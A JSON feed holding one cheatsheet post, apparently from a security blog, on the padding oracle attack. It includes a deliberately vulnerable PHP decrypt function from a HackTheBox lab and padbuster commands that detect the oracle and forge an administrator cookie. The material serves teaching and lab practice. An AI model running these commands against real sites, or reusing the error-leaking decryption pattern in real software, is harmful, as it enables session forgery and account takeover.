{
    "version": "https://jsonfeed.org/version/1",
    "title": "Spindel",
    "home_page_url": "https://mvineza.github.io/spindel/",
    "feed_url": "https://mvineza.github.io/spindel/feed.json",
    "description": "A minimalist, quick search cybersecurity blog and cheatsheets",
    "icon": "https://mvineza.github.io/spindel/apple-touch-icon.png",
    "favicon": "https://mvineza.github.io/spindel/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "spindel",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://mvineza.github.io/spindel/2021/12/25/padding-oracle-attack",
            "title": "Padding Oracle Attack",
            "summary": null,
            "content_text": "OverviewCBD mode PKCS7 format uses padding to complete the block length when encrypting plaintext.Attacker can leverage this behaviour to get the plaintext by manipulating the ciphertext byte by byte in a trial and error fashion and observing whether the application will return error (invalid padding) or success (valid padding).This kind of crypto may be safe but the real attack surface is on whether your app is returning error on invalid padding which will give an attacker chance to brute force the correct plaintext.// example file from HTB lazyfunction decryptString($encryptedText, $passphrase) {  $encrypted = base64_decode($encryptedText);  $iv_size =  mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_CBC);  $iv = substr($encrypted,0,$iv_size);  $dec = mcrypt_decrypt(MCRYPT_DES, $passphrase, substr($encrypted,$iv_size), MCRYPT_MODE_CBC, $iv);  $str = pkcs5_unpad($dec);  if ($str === false) {    echo \"Invalid padding\"; // really? you want to be hacked?    die();                  // maybe let's replace that or  }                         // remove entirely?  else {    return $str;  }}This is also a type of CCA or Chosen Ciphertext Attack.Details on ciphertext manipulationGo to “The Theory” part of this link.Detection  Try manipulating cookie values. See if webapp will error response such as invalid padding or 500,Exploitation  Using padbuster# installationsudo apt-get install padbuster# detectionpadbuster http://10.10.10.10/index.php \"RVJDQrwUdTRWJUVUeBKkEA==\" 8 -encoding 0 -cookies \"login=RVJDQrwUdTRWJUVUeBKkEA==\"# gets an admin cookiepadbuster http://10.10.10.10/index.php \"RVJDQrwUdTRWJUVUeBKkEA==\" 8 -encoding 0 -cookies \"login=RVJDQrwUdTRWJUVUeBKkEA==\" -plaintext \"user=administrator\"  Using bit flippingattack. Here is another resource from ippsec using Burp.References  Padding Oracle - HackTricks  HTB Lazy  Mathematical Explanation  The Padding Oracle Attack",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>CBD mode PKCS7 format uses padding to complete the block length when encrypting plaintext.</p><p><img src=\"/assets/Padding Oracle Attack/padding.png\" alt=\"\" /></p><p>Attacker can leverage this behaviour to get the plaintext by manipulating the ciphertext byte by byte in a trial and error fashion and observing whether the application will return error (invalid padding) or success (valid padding).</p><p>This kind of crypto may be safe but the real attack surface is on whether your app is returning error on invalid padding which will give an attacker chance to brute force the correct plaintext.</p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// example file from HTB lazy</span><span class=\"k\">function</span> <span class=\"n\">decryptString</span><span class=\"p\">(</span><span class=\"nv\">$encryptedText</span><span class=\"p\">,</span> <span class=\"nv\">$passphrase</span><span class=\"p\">)</span> <span class=\"p\">{</span>  <span class=\"nv\">$encrypted</span> <span class=\"o\">=</span> <span class=\"nb\">base64_decode</span><span class=\"p\">(</span><span class=\"nv\">$encryptedText</span><span class=\"p\">);</span>  <span class=\"nv\">$iv_size</span> <span class=\"o\">=</span>  <span class=\"nb\">mcrypt_get_iv_size</span><span class=\"p\">(</span><span class=\"no\">MCRYPT_DES</span><span class=\"p\">,</span> <span class=\"no\">MCRYPT_MODE_CBC</span><span class=\"p\">);</span>  <span class=\"nv\">$iv</span> <span class=\"o\">=</span> <span class=\"nb\">substr</span><span class=\"p\">(</span><span class=\"nv\">$encrypted</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"nv\">$iv_size</span><span class=\"p\">);</span>  <span class=\"nv\">$dec</span> <span class=\"o\">=</span> <span class=\"nb\">mcrypt_decrypt</span><span class=\"p\">(</span><span class=\"no\">MCRYPT_DES</span><span class=\"p\">,</span> <span class=\"nv\">$passphrase</span><span class=\"p\">,</span> <span class=\"nb\">substr</span><span class=\"p\">(</span><span class=\"nv\">$encrypted</span><span class=\"p\">,</span><span class=\"nv\">$iv_size</span><span class=\"p\">),</span> <span class=\"no\">MCRYPT_MODE_CBC</span><span class=\"p\">,</span> <span class=\"nv\">$iv</span><span class=\"p\">);</span>  <span class=\"nv\">$str</span> <span class=\"o\">=</span> <span class=\"nf\">pkcs5_unpad</span><span class=\"p\">(</span><span class=\"nv\">$dec</span><span class=\"p\">);</span>  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$str</span> <span class=\"o\">===</span> <span class=\"kc\">false</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"k\">echo</span> <span class=\"s2\">\"Invalid padding\"</span><span class=\"p\">;</span> <span class=\"c1\">// really? you want to be hacked?</span>    <span class=\"k\">die</span><span class=\"p\">();</span>                  <span class=\"c1\">// maybe let's replace that or</span>  <span class=\"p\">}</span>                         <span class=\"c1\">// remove entirely?</span>  <span class=\"k\">else</span> <span class=\"p\">{</span>    <span class=\"k\">return</span> <span class=\"nv\">$str</span><span class=\"p\">;</span>  <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>This is also a type of CCA or Chosen Ciphertext Attack.</p><h2 id=\"details-on-ciphertext-manipulation\">Details on ciphertext manipulation</h2><p>Go to “The Theory” part of this <a href=\"https://pentesterlab.com/exercises/padding_oracle/course\">link</a>.</p><h2 id=\"detection\">Detection</h2><ul>  <li>Try manipulating cookie values. See if webapp will error response such as <code class=\"language-plaintext highlighter-rouge\">invalid padding</code> or <code class=\"language-plaintext highlighter-rouge\">500</code>,</li></ul><h2 id=\"exploitation\">Exploitation</h2><ul>  <li>Using padbuster</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># installation</span><span class=\"nb\">sudo </span>apt-get <span class=\"nb\">install </span>padbuster<span class=\"c\"># detection</span>padbuster http://10.10.10.10/index.php <span class=\"s2\">\"RVJDQrwUdTRWJUVUeBKkEA==\"</span> 8 <span class=\"nt\">-encoding</span> 0 <span class=\"nt\">-cookies</span> <span class=\"s2\">\"login=RVJDQrwUdTRWJUVUeBKkEA==\"</span><span class=\"c\"># gets an admin cookie</span>padbuster http://10.10.10.10/index.php <span class=\"s2\">\"RVJDQrwUdTRWJUVUeBKkEA==\"</span> 8 <span class=\"nt\">-encoding</span> 0 <span class=\"nt\">-cookies</span> <span class=\"s2\">\"login=RVJDQrwUdTRWJUVUeBKkEA==\"</span> <span class=\"nt\">-plaintext</span> <span class=\"s2\">\"user=administrator\"</span></code></pre></div></div><ul>  <li>Using <a href=\"https://0xdf.gitlab.io/2020/07/29/htb-lazy.html#path-2-bit-flip-attack\">bit flippingattack</a>. Here is another resource from <a href=\"https://www.youtube.com/watch?v=3VxZNflJqsw&amp;t=460s\">ippsec</a> using Burp.</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/cryptography/padding-oracle-priv#padding-oracle\">Padding Oracle - HackTricks</a></li>  <li><a href=\"https://www.youtube.com/watch?v=3VxZNflJqsw\">HTB Lazy</a></li>  <li><a href=\"https://www.youtube.com/watch?v=aH4DENMN_O4&amp;t=873s\">Mathematical Explanation</a></li>  <li><a href=\"https://robertheaton.com/2013/07/29/padding-oracle-attack/\">The Padding Oracle Attack</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2021/12/25/padding-oracle-attack",
            
            
            
            "tags": ["web","crypto","foothold"],
            
            "date_published": "2021-12-25T00:00:00+08:00",
            "date_modified": "2021-12-25T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}